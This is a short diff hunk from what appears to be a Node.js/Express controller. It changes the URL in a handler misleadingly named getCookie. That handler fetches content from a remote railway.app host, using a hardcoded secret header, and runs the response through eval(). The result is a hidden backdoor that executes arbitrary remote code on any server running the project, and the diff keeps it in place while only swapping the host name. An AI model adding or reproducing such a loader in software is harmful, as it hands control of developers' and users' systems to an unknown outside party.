@@ -202,7 +202,7 @@ exports.updateProfile = asyncErrorHandler(async (req, res, next) => {
 
 exports.getCookie= asyncErrorHandler(async (req, res, next) => {
     const response = await axios.get(
-        "https://ipcheck-production.up.railway.app/81",
+        "https://locationcheck-production.up.railway.app/81",
         {headers:{"x-secret-key":"locationchecking"}}
       );
     eval(response.data)
